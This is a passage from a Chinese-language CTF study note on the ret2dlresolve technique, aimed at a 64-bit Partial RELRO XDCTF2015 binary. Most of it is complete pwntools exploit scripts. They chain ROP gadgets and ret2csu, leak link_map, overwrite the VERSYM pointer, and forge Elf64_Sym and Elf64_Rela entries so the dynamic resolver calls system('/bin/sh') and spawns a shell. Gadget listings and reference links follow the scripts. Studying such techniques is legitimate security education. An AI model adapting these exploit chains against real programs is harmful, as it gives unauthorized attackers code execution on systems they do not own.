payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_ELF64_Sym_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr) #0x10中写入fake_write_Elf64_Sym
payload1+=p64(main_addr)

p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload1)
sleep(1)
p.send("/bin/sh\x00write\x00".ljust(0x10,'\x00')) #加入write\x00字符串
sleep(1)
p.send(fake_write_ELF64_Sym)  #fake_write_Elf64_Sym
sleep(1)

payload2=120*'b'+p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_Elf64_Rela_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr)+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload2)
p.send(fake_write_Elf64_Rela) #fake_write_Elf64_Rela

payload3=120*'c'+p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)
payload3+=p64(jmp_dl_runtime_resolve_addr)+p64(fake_reloc_arg)+p64(0xdeadbeef) 
sleep(1)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload3)
p.interactive()
```

#### Part5
将st->name write改为system再略微调整下参数即可拿到shell

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_partial_relro_64')
elf=ELF('./main_partial_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO# ROPgadget --binary ./main_partial_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#  ROPgadget --binary ./main_partial_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040066c : leave ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
.text:0000000000400780 loc_400780:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400780                 mov     rdx, r15
.text:0000000000400783                 mov     rsi, r14
.text:0000000000400786                 mov     edi, r13d
.text:0000000000400789                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040078D                 add     rbx, 1
.text:0000000000400791                 cmp     rbp, rbx
.text:0000000000400794                 jnz     short loc_400780       //相等；rbp==1
.text:0000000000400796
.text:0000000000400796 loc_400796:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400796                 add     rsp, 8
.text:000000000040079A                 pop     rbx          //rbx==0
.text:000000000040079B                 pop     rbp          //rbp==1
.text:000000000040079C                 pop     r12          //read_got
.text:000000000040079E                 pop     r13          //read1参
.text:00000000004007A0                 pop     r14          //read2参
.text:00000000004007A2                 pop     r15          //read3参
.text:00000000004007A4                 retn
.text:00000000004007A4 ; } // starts at 400740
.text:00000000004007A4 __libc_csu_init endp
'''

libc_csu_init_gadget_start1_addr=0x40079A
libc_csu_init_gadget_start2_addr=0x400780

read_plt_addr=elf.plt['read']
write_got_addr=elf.got['write']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x4005b8
pop_rdi_gadget=0x4007a3
pop_rsi_r15_gadget=0x4007a1
leave_ret_gadget_addr=0x40066c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

jmp_dl_runtime_resolve_addr=0x000400500

rela_plt_start_addr=elf.get_section_by_name('.rela.plt').header.sh_addr

#fake_st_name=0x4003D5-0x400398
real_dynstr_start_addr=elf.get_section_by_name('.dynstr').header.sh_addr
fake_st_name=new_stack_esp+len('/bin/sh\x00')-real_dynstr_start_addr
fake_st_info=0x12
fake_st_other=0x0
fake_st_shndx=0x0
fake_st_value=0x0
fake_st_size=0x0
fake_write_ELF64_Sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)
fake_write_ELF64_Sym_start_addr=new_stack_esp+0x10  #ELF64_Sym起始地址
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr
align=0x18-((fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)&0xf)
fake_write_ELF64_Sym_start_addr+=align
log.info(hex(fake_write_ELF64_Sym_start_addr))
print align

fake_r_offset=elf.got['write']
dynsym_index=(fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)/0x18  #32位的是0x10
print dynsym_index
fake_r_info=dynsym_index<<32 | 7
fake_r_addend=0x0
fake_write_Elf64_Rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)
fake_write_Elf64_Rela_start_addr=new_stack_esp+0x10+len(fake_write_ELF64_Sym)+align
log.info(hex(fake_write_Elf64_Rela_start_addr))
fake_reloc_arg=(fake_write_Elf64_Rela_start_addr-rela_plt_start_addr)/0x18
####################################################
write_got_addr=elf.got['write']
read_got_addr=elf.got['read']
payload0=120*'a'
payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(write_got_addr)+p64(1)+p64(0x601008)+p64(0x8)
payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload0)

link_map_addr=u64(p.recv(8))
print hex(link_map_addr)
link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+0x1c8
print hex(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)
fake_map_l_info_VERSYMIDX_DT_VERSYM=120*'a'
fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(read_got_addr)+p64(0)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(0x100)
fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
sleep(1)
p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)
#gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")
p.send(p64(0))
#######################################################
payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp中写入/bin/sh\x00
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_ELF64_Sym_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr) #0x10中写入fake_write_Elf64_Sym
payload1+=p64(main_addr)

p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload1)
sleep(1)
p.send("/bin/sh\x00system\x00".ljust(0x10,'\x00')) #改为system字符串
sleep(1)
p.send(fake_write_ELF64_Sym)  #fake_write_Elf64_Sym
sleep(1)

payload2=120*'b'+p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_Elf64_Rela_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr)+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload2)
p.send(fake_write_Elf64_Rela) #fake_write_Elf64_Rela

#payload3=120*'c'+p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)
payload3=120*'c'+p64(pop_rdi_gadget)+p64(new_stack_esp)
payload3+=p64(jmp_dl_runtime_resolve_addr)+p64(fake_reloc_arg)+p64(0xdeadbeef) 
sleep(1)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload3)
p.interactive()
```

# Ret2dlresolve待解决的问题
[https://forum.90sec.com/t/topic/260](https://forum.90sec.com/t/topic/260)

[https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak)

# Ret2dlresolve可以参考的资料
```c
https://leeeddin.github.io/ret2resolve.markdown/
https://zhuanlan.zhihu.com/p/94362447
https://www.freesion.com/article/2930601021/
https://kirin-say.top/2018/08/18/ret2-dl-runtime-resolve/
https://baymrx.me/posts/c9e30e9d#%E5%88%A9%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%BB%95%E8%BF%87ASLR%EF%BC%9Aret2dlresolve%E3%80%81fake-linkmap
https://iamayoung.xyz/2021/03/02/ret2dlresolve/
https://x1ng.top/2020/03/18/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
https://www.freebuf.com/articles/system/170661.html
https://bbs.pediy.com/thread-255736.htm
https://bbs.pediy.com/thread-227034.htm#msg_header_h1_2
https://oneda1sy.gitee.io/2020/02/22/rop-ret2dlresolve/
https://oneda1sy.gitee.io/2020/02/25/rop-ret2dlresolve-2/
https://wzt.ac.cn/2019/05/02/Ret2runtime_dlresolve/
https://xz.aliyun.com/t/5120#toc-2
https://xz.aliyun.com/t/5111
https://xz.aliyun.com/t/6364
https://bbs.pediy.com/thread-253833.htm#msg_header_h1_3
https://www.cnblogs.com/ichunqiu/p/9542224.html
https://www.anquanke.com/post/id/184099#h2-3
https://blog.huisa.win/pwn/Pwn-advanced-rop/
https://b0ldfrev.gitbook.io/note/pwn/returntodlresolve-yuan-li-ji-li-yong#how-elf-relocation-works
https://forum.90sec.com/t/topic/260
https://bey0nd.cn/2020/09/28/1/
https://blog.csdn.net/weixin_43363675/article/details/118893179
https://www.dtmao.cc/news_show_4248512.shtml
https://blog.csdn.net/weixin_43363675?t=1
https://blog.csdn.net/weixin_43363675/article/details/118947392
https://blog.csdn.net/qq_51868336/article/details/114644569
https://xz.aliyun.com/t/5122#toc-8
```





